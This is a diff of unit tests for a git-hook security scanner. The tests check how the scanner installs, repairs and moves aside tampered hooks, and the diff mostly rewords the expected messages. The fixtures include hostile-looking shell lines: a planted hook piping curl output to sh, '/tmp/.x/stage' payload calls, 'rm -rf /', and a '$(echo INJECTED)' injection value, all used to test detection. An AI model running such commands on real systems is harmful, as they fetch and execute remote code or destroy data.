@@ -17,7 +17,7 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
-from stayawake.bots.security import hook, hook_report, hookscript
+from stayawake.bots.security import hook, hook_outcome, hook_report, hookscript
 from stayawake.bots.security.dependencies import db
 from stayawake.bots.security.models import ScanResult
 from tests.bots.security._osv_fixtures import mal_record, osv_zip
@@ -106,7 +106,7 @@ class TestEveryHookIsInstalledTheSameWay(_Isolated):
             self.assertEqual(hook.install(repositories=[str(repo)]), 0)
         self.assertFalse(self._ours(repo, "pre-push"))
         self.assertFalse((repo / ".husky").exists(), "nothing is written where its hooks path points")
-        self.assertIn(str(repo), out.getvalue())
+        self.assertIn(hook_outcome._shown([Path(os.path.realpath(repo))]), out.getvalue())
 
     def test_the_configured_local_targets_get_the_hooks(self):
         repo = self._existing()
@@ -271,18 +271,20 @@ class TestTheHookJudgesAsTheScanDoes(_Isolated):
         with mock.patch.object(hook, "_scan_within_budget", return_value=result):
             self.assertEqual(self._clone_event(repo), 1)
 
-    def test_a_scan_that_hit_an_error_says_not_verified_and_what_to_run(self):
+    def test_a_scan_that_hit_an_error_says_it_is_not_known_to_be_clean_and_what_to_run(self):
         from stayawake.bots.security.models import ScanResult
         repo = self._repo_here({"a.txt": "ok\n"})
-        result = ScanResult(target=str(repo), source="local", error="b.js could not be read")
+        result = ScanResult(target=str(repo), source="local",
+                            error="PermissionError: [Errno 13] Permission denied: '/kept/by/saw'")
         err = io.StringIO()
         with mock.patch.object(hook, "_scan_within_budget", return_value=result), \
              contextlib.redirect_stderr(err):
             code = hook.run_event("post-checkout", ["0" * 40, self._head(repo), "1"])
         self.assertEqual(code, 2)
         out = " ".join(err.getvalue().split())
-        self.assertIn("NOT verified", out)
+        self.assertIn("not known to be clean", out)
         self.assertIn("saw scan", out)
+        self.assertNotIn("/kept/by/saw", out)
 
     def test_a_repository_name_cannot_inject_into_the_line_or_the_command_to_run(self):
         from stayawake.bots.security.models import ScanResult
@@ -309,12 +311,12 @@ class TestTheHookJudgesAsTheScanDoes(_Isolated):
         self.assertIn("saw scan '/w/x$(echo INJECTED)'", err.getvalue())
         self.assertIn("saw fix --path '/w/x$(echo INJECTED)'", err.getvalue())
 
-    def test_a_check_that_crashed_says_not_verified_without_its_exception(self):
+    def test_a_check_that_crashed_says_it_is_not_known_to_be_clean_without_its_exception(self):
         err = io.StringIO()
         with mock.patch.object(hook, "_run_event", side_effect=RuntimeError("\x1b[2Jboom")), \
              contextlib.redirect_stderr(err):
             self.assertEqual(hook.run_event("post-checkout", ["a", "b", "1"]), 2)
-        self.assertIn("NOT verified", err.getvalue())
+        self.assertIn("not known to be clean", err.getvalue())
         self.assertNotIn("boom", err.getvalue())
 
     def test_an_infected_repository_is_reported_on_every_clone(self):
@@ -687,7 +689,7 @@ class TestTheHooksSettingIsReadAsGitUsesIt(_Isolated):
         with mock.patch.object(hook.gitutil, "run", failing):
             code, out = self._install()
         self.assertEqual(code, 3)
-        self.assertIn("NOT verified", out)
+        self.assertIn("it is not known whether new clones are scanned", out)
         self.assertNotIn("✓ scan-on-clone installed", out)
 
     def test_a_setting_from_the_environment_is_seen(self):
@@ -1265,6 +1267,26 @@ def _set_aside(home: Path) -> list[Path]:
     return sorted(root.iterdir()) if root.is_dir() else []
 
 
+def _reporting(fn, *args) -> tuple[int, str, list]:
+    """Run a hook command with its output captured. Takes the command and its arguments. Returns its
+    status, what it printed, and every action it reported."""
+    done: list = []
+    real = hook._print_actions
+
+    def record(actions, stream, **kwargs):
+        done.extend(actions)
+        return real(actions, stream, **kwargs)
+
+    out = io.StringIO()
+    with mock.patch.object(hook, "_print_actions", side_effect=record), contextlib.redirect_stdout(out):
+        code = fn(*args)
+    return code, out.getvalue(), done
+
+
+def _states(done: list) -> list[tuple[str, Path]]:
+    return [(a.state, a.path) for a in done]
+
+
 class TestSawsDirectoryIsSawsAlone(_Isolated):
     def _managed(self) -> Path:
         return self.home / ".config" / "saw" / "git-template" / "hooks"
@@ -1298,8 +1320,8 @@ class TestSawsDirectoryIsSawsAlone(_Isolated):
         record = json.loads((by_name["post-checkout"] / "origin.json").read_text())
         self.assertEqual(record["path"], str(planted))
         self.assertTrue(record["sha256"].startswith(hook.hookscript.digest_file(by_name["post-checkout"] / "kept" / "post-checkout")[:64]))
-        self.assertIn("set aside", text)
-        self.assertIn(str(planted), text)
+        self.assertIn("moved aside", text)
+        self.assertNotIn(str(planted), text)
 
     def test_an_altered_saw_hook_is_repaired_and_its_content_kept(self):
         self.assertEqual(self._quiet(hook.install)[0], 0)
@@ -1311,7 +1333,7 @@ class TestSawsDirectoryIsSawsAlone(_Isolated):
         self.assertEqual(hook.hookscript.verdict(managed / "post-merge"), hook.hookscript.PRISTINE)
         (kept,) = _set_aside(self.home)
         self.assertEqual((kept / "kept" / "post-merge").read_text(), altered)
-        self.assertIn("repaired", text)
+        self.assertIn("had been changed", text)
 
     def test_the_operators_own_template_directory_keeps_their_hook_but_not_an_altered_one_of_saws(self):
         user_tpl = self.home / "my-template"
@@ -1361,7 +1383,7 @@ class TestSawsDirectoryIsSawsAlone(_Isolated):
         with mock.patch("os.rename", side_effect=tampered):
             code, text = self._quiet(hook.install)
         self.assertEqual(code, 3, text)
-        self.assertIn("could not verify", text)
+        self.assertIn("could be put in place", text)
         self.assertIn("NOT fully installed", text)
         self.assertEqual(hook.hookscript.installed(), (hook._saw_executable(), None))
 
@@ -1377,7 +1399,7 @@ class TestSawsDirectoryIsSawsAlone(_Isolated):
         kept = _set_aside(self.home)
         self.assertEqual(sorted(Path(json.loads((f / "origin.json").read_text())["path"]).name for f in kept),
                          ["post-checkout.local", "post-merge"])
-        self.assertIn("set aside", text)
+        self.assertIn("moved aside", text)
 
     def test_a_link_in_saws_directory_is_moved_aside_even_when_it_points_at_a_hook_saw_installs(self):
         managed = self._managed()
@@ -1459,7 +1481,7 @@ class TestRepair(_Isolated):
         managed = self.home / ".config" / "saw" / "git-template" / "hooks"
         (managed / "post-rewrite").write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n")
 
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
         self.assertEqual(hook.hookscript.verdict(altered), hook.hookscript.PRISTINE)
         self.assertIn(f"--config {cfg}", altered.read_text())
@@ -1468,19 +1490,19 @@ class TestRepair(_Isolated):
         self.assertEqual(hook.hookscript.verdict(managed / "post-rewrite", (hook._saw_executable(), str(cfg))),
                          hook.hookscript.PRISTINE)
         self.assertEqual(len(_set_aside(self.home)), 3)
-        self.assertIn(f"repaired: {altered}", text)
-        self.assertIn(f"updated: {hooks / 'post-merge'}", text)
+        self.assertIn((hook.REPAIRED, altered), _states(done))
+        self.assertIn((hook.UPDATED, hooks / "post-merge"), _states(done))
         self.assertIn(hook._saw_executable(), (hooks / "post-merge").read_text())
-        self.assertIn(f"left: {theirs}", text)
-        self.assertIn(f"chained: {chained}", text)
-        self.assertIn(f"set aside: {managed / 'post-rewrite'}", text)
+        self.assertIn((hook.LEFT, theirs), _states(done))
+        self.assertIn((hook.CHAINED, chained), _states(done))
+        self.assertIn((hook.SET_ASIDE, managed / "post-rewrite"), _states(done))
 
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
         self.assertEqual(len(_set_aside(self.home)), 3)
-        self.assertNotIn("repaired:", text)
-        self.assertNotIn("set aside:", text)
-        self.assertNotIn("updated:", text)
+        self.assertNotIn(hook.REPAIRED, [a.state for a in done])
+        self.assertNotIn(hook.SET_ASIDE, [a.state for a in done])
+        self.assertNotIn(hook.UPDATED, [a.state for a in done])
 
     def test_a_repository_git_cannot_answer_for_withholds_the_all_clear(self):
         self.assertEqual(self._quiet(hook.install)[0], 0)
@@ -1493,7 +1515,7 @@ class TestRepair(_Isolated):
         self.addCleanup(os.chmod, gitdir, 0o700)
         code, text = self._quiet(hook.repair)
         self.assertEqual(code, 3, text)
-        self.assertIn(f"could not read: {repo}", text)
+        self.assertIn(f"git reports an error in {repo}", text)
 
     def test_a_shared_hooks_directory_is_settled_once(self):
         self.assertEqual(self._quiet(hook.install)[0], 0)
@@ -1501,11 +1523,11 @@ class TestRepair(_Isolated):
         repo = self._seeded("c")
         _run(repo, "config", "core.hooksPath", str(managed))
         (managed / "post-merge").write_text("#!/bin/sh\n/tmp/.x/stage\n")
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertEqual(text.count("set aside:"), 1)
+        self.assertEqual([a.state for a in done].count(hook.SET_ASIDE), 1)
         self.assertEqual(len(_set_aside(self.home)), 1)
-        self.assertEqual(text.count(str(managed / "post-checkout")), 1, text)
+        self.assertEqual([a.path for a in done].count(managed / "post-checkout"), 1, done)
 
 
 class TestRepairLeavesWhatIsNotSaws(_Isolated):
@@ -1531,9 +1553,9 @@ class TestRepairLeavesWhatIsNotSaws(_Isolated):
         marked = theirs_tpl / "hooks" / "post-merge"
         marked.write_text(hook.hookscript.render("post-merge", str(self.home / "evil" / "saw"), None))
         os.chmod(marked, 0o755)
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertIn(f"updated: {marked}", text)
+        self.assertIn((hook.UPDATED, marked), _states(done))
         self.assertEqual(hook.hookscript.verdict(marked, hook.hookscript.installed()), hook.hookscript.PRISTINE)
         self.assertEqual(sorted(p.name for p in (theirs_tpl / "hooks").iterdir()), ["post-checkout", "post-merge"])
         self.assertEqual(theirs.read_text(), "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")
@@ -1558,12 +1580,12 @@ class TestRepairLeavesWhatIsNotSaws(_Isolated):
         crlf.write_bytes(crlf.read_bytes().replace(b"\n", b"\r\n"))
         self.assertEqual(hook.hookscript.verdict(crlf), hook.hookscript.ALTERED)
         os.chmod(managed / "post-merge", 0o644)
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
         self.assertNotIn(b"\r", crlf.read_bytes())
         self.assertTrue(os.access(managed / "post-merge", os.X_OK))
-        self.assertIn(f"repaired: {crlf}", text)
-        self.assertIn(f"updated: {managed / 'post-merge'}", text)
+        self.assertIn((hook.REPAIRED, crlf), _states(done))
+        self.assertIn((hook.UPDATED, managed / "post-merge"), _states(done))
 
     def test_a_path_is_printed_as_one_plain_line(self):
         managed = self.home / ".config" / "saw" / "git-template" / "hooks"
@@ -1600,9 +1622,9 @@ class TestRepairLeavesWhatIsNotSaws(_Isolated):
         cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
         cache.parent.mkdir(parents=True, exist_ok=True)
         cache.write_text(json.dumps({str(main): "abc", str(linked): "abc"}))
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertEqual(text.count("/post-checkout\n"), 2, text)
+        self.assertEqual([a.path.name for a in done].count("post-checkout"), 2, done)
         self.assertNotIn("moved-aside", text)
 
 
@@ -1661,12 +1683,12 @@ class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
         cache.write_text(json.dumps({str(repo): "abc"}))
         for event in hook._HOOKS:
             (repo / ".git" / "hooks" / event).unlink()
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
         for event in hook._HOOKS:
             self.assertEqual(hook.hookscript.verdict(repo / ".git" / "hooks" / event, (hook._saw_executable(), None)),
                              hook.hookscript.PRISTINE)
-        self.assertIn(f"restored: {repo / '.git' / 'hooks' / 'post-checkout'}", text)
+        self.assertIn((hook.RESTORED, repo / ".git" / "hooks" / "post-checkout"), _states(done))
         self.assertEqual(_set_aside(self.home), [])
 
     def test_uninstall_never_lets_a_chained_hook_overwrite_one_it_could_not_move_aside(self):
@@ -1706,7 +1728,7 @@ class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
         os.symlink(elsewhere, self._managed())
         code, text = self._quiet(hook.install)
         self.assertEqual(code, 3, text)
-        self.assertIn("could not verify", text)
+        self.assertIn("could be put in place", text)
         self.assertEqual((elsewhere / "thesis.txt").read_text(), "years\n")
         self.assertEqual(sorted(p.name for p in elsewhere.iterdir()), ["thesis.txt"])
         self.assertEqual(_set_aside(self.home), [])
@@ -1773,7 +1795,7 @@ class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
         header = hook.hookscript.render("post-merge", "/x/saw", None).splitlines()[1]
         self.assertTrue(hook.hookscript.claims_ours(header + "\nrm -rf /\n"))
 
-    def test_a_long_path_is_printed_whole(self):
+    def test_what_is_moved_aside_is_said_without_where_it_was(self):
         deep = self._managed()
         for i in range(12):
             deep = deep / f"a-very-long-directory-name-number-{i:02d}-padding-padding"
@@ -1783,7 +1805,8 @@ class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
         with mock.patch("stayawake.bots.security.hookscript.hooks_dir", return_value=deep), \
                 mock.patch("stayawake.bots.security.hook._hooks_dir", return_value=deep):
             code, text = self._quiet(hook.install)
-        self.assertIn(str(deep / "stray"), text)
+        self.assertIn("moved aside", text)
+        self.assertNotIn("a-very-long-directory-name", text)
 
 
 class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
@@ -1810,16 +1833,16 @@ class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
         _run(repo, "add", "-A")
         _run(repo, "commit", "-qm", "husky")
         self._seed(repo)
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
         self.assertEqual(sorted(p.name for p in (repo / ".husky").iterdir()), ["pre-commit"])
         self.assertEqual(subprocess.run(["git", "-C", str(repo), "status", "--porcelain"],
                                         capture_output=True, text=True).stdout, "")
-        self.assertIn(f"left: {repo}", text)
+        self.assertIn((hook.LEFT, repo), _states(done))
         _run(repo, "config", "core.hooksPath", "/dev/null")
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertNotIn("could not verify", text)
+        self.assertNotIn(hook.UNVERIFIED, [a.state for a in done])
 
     def test_a_removed_hooks_directory_is_seeded_again(self):
         self.assertEqual(self._quiet(hook.install)[0], 0)
@@ -1827,9 +1850,9 @@ class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
         self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
         __import__("shutil").rmtree(repo / ".git" / "hooks")
         self._seed(repo)
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertIn("restored:", text)
+        self.assertIn(hook.RESTORED, [a.state for a in done])
         self.assertEqual(sorted(p.name for p in (repo / ".git" / "hooks").iterdir()), sorted(hook._HOOKS))
 
     def test_repair_puts_back_the_saw_that_was_recorded_not_the_one_in_the_path(self):
@@ -1840,21 +1863,21 @@ class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
         other.write_text("#!/bin/sh\n")
         os.chmod(other, 0o755)
         with mock.patch("stayawake.bots.security.hook._saw_executable", return_value=str(other)):
-            code, text = self._quiet(hook.repair)
+            code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertNotIn("updated:", text)
+        self.assertNotIn(hook.UPDATED, [a.state for a in done])
         self.assertEqual(_set_aside(self.home), [])
         self.assertEqual(hook.hookscript.installed(), recorded)
         gone = self.home / "gone" / "saw"
         hook.hookscript.declaration_path().write_text(json.dumps({"saw": str(gone), "config": None}))
         for event in hook._HOOKS:
             (hook._hooks_dir() / event).write_text(hook.hookscript.render(event, str(gone), None))
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertEqual(text.count("updated:"), len(hook._HOOKS))
+        self.assertEqual([a.state for a in done].count(hook.UPDATED), len(hook._HOOKS))
         self.assertIn(hook._saw_executable(), (hook._hooks_dir() / "post-merge").read_text())
 
-    def test_a_recorded_config_that_is_gone_stops_repair_and_is_named_by_status(self):
+    def test_a_recorded_config_that_is_gone_stops_repair_and_status_says_so(self):
         cfg = self.home / "security.yml"
         cfg.write_text("allowlist: []\n")
         self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
@@ -1863,8 +1886,13 @@ class TestRepairPutsBackOnlyWhatSawSeeded(_Isolated):
         with contextlib.redirect_stderr(err):
             code, text = self._quiet(hook.repair)
         self.assertEqual(code, 2)
-        self.assertIn(str(cfg), err.getvalue())
-        self.assertIn(str(cfg), self._quiet(hook.status)[1])
+        self.assertIn("the config your hooks scan with is gone", err.getvalue())
+        self.assertNotIn(str(cfg), err.getvalue())
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            shown = self._quiet(hook.status)[1]
+        self.assertIn("the config your hooks scan with is gone", shown)
+        self.assertNotIn(str(cfg), shown + err.getvalue())
         self.assertIn(str(cfg), (hook._hooks_dir() / "post-merge").read_text())
 
     def test_without_a_record_a_hook_naming_another_config_is_not_an_alarm(self):
@@ -1911,7 +1939,7 @@ class TestTheRecordIsTheOnlyAuthority(_Isolated):
         self._seed(decoy)
         code, text = self._quiet(hook.repair)
         self.assertEqual(code, 3, text)
-        self.assertIn("could not verify", text)
+        self.assertIn("could be put in place", text)
         self.assertEqual([e for e in hook._HOOKS if (victim / ".git" / "hooks" / e).exists()], [])
 
     def test_a_same_name_of_another_case_is_never_counted_as_the_hook(self):
@@ -1985,17 +2013,17 @@ class TestTheRecordIsTheOnlyAuthority(_Isolated):
         theirs.write_text("#!/bin/sh\necho theirs\n")
         os.chmod(theirs, 0o755)
         hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(other)], context=hook.gitutil.OPERATOR_CONFIG)
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertIn(f"updated: {planted}", text)
+        self.assertIn((hook.UPDATED, planted), _states(done))
         self.assertNotIn(str(self.home / "evil" / "saw"), planted.read_text())
         self.assertEqual(theirs.read_text(), "#!/bin/sh\necho theirs\n")
         self.assertEqual(sorted(p.name for p in (other / "hooks").iterdir()), ["post-checkout", "post-merge"])
         altered = user_tpl / "hooks" / "post-merge"
         altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertIn(f"repaired: {altered}", text)
+        self.assertIn((hook.REPAIRED, altered), _states(done))
 
     def test_install_always_sweeps_saws_own_directory(self):
         user_tpl = self.home / "my-template"
@@ -2005,10 +2033,10 @@ class TestTheRecordIsTheOnlyAuthority(_Isolated):
         managed.mkdir(parents=True)
         planted = managed / "post-checkout.local"
         planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
-        code, text = self._quiet(hook.install)
+        code, text, done = _reporting(hook.install)
         self.assertEqual(code, 0, text)
         self.assertFalse(planted.exists())
-        self.assertIn(f"set aside: {planted}", text)
+        self.assertIn((hook.SET_ASIDE, planted), _states(done))
 
     def test_uninstall_keeps_a_stale_hook_aside(self):
         self.assertEqual(self._quiet(hook.install)[0], 0)
@@ -2041,9 +2069,9 @@ class TestTheRecordIsTheOnlyAuthority(_Isolated):
         altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
         self.assertEqual(hook.hookscript.altered_hooks(), [altered])
         self.assertIn("saw hook repair", self._quiet(hook.status)[1])
-        code, text = self._quiet(hook.repair)
+        code, text, done = _reporting(hook.repair)
         self.assertEqual(code, 0, text)
-        self.assertIn(f"repaired: {altered}", text)
+        self.assertIn((hook.REPAIRED, altered), _states(done))
         self.assertEqual(hook.hookscript.altered_hooks(), [])
         self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])
 
